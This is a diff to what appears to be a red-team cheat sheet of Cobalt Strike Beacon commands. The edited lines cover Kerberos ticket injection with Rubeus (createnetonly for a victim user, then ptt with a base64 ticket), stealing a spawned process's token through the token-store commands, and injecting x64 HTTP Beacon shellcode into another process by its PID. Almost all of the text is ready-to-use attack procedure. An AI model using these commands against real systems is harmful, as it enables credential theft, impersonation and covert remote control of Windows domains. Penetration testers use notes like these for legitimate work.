@@ -78,9 +78,10 @@ beacon> kerberos_ticket_purge   # purge ticket but keep session
 beacon> rev2self                # revert to original session
 
 2. # Rubeus -- Inject TGT AND service tickets, and accepts base64 & .kirbi
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:[victim] /domain:[domain] /password:FakePass              # spawn hidden process w/new logon session, make_token alternative. Make note of LUID and PID
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:[victim] /domain:[domain] /password:FakePass              # spawn hidden process w/new logon session. make_token Alternative. Make note of LUID and PID
 beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:[luid] /ticket:[base64 ticket]  # Inject ticket into process
-beacon> steal_token [PID]       # Steal token of spawned process. See NOTES.
+beacon> token-store steal [PID] # Steal token of spawned process. See NOTES.
+beacon> token-store use 0
 
 beacon> rev2self                # drop impersonation when done
 beacon> kill [PID]              # kill process
@@ -101,7 +102,10 @@ A crude technique for impersonating a user, is to inject Beacon shellcode direct
 NOTE: requires high-integrity session.
 
 ```powershell
-beacon> ps                       # make note of PIDs and Users
-	# or process_browser
-beacon> inject [PID] x64 http    # example of injecting x64 http beacon 
+# snoop on processes
+beacon> [ps | process_browser]      # make note of PIDs and Users
+
+# Inject shellcode (2 ways)
+1. beacon> inject [PID] x64 http    # example of injecting x64 http beacon 
+2. click inject > tcp-local listener
 ```
